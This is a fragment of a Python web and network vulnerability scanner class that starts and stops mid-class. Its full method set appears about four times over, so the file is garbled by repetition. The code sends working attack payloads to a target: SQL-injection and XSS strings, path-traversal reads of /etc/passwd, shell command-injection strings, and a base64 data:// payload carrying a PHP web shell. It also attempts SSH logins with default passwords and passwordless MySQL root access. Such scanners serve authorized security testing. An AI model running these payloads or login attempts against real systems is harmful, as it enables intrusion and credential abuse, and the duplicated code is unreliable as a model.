        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
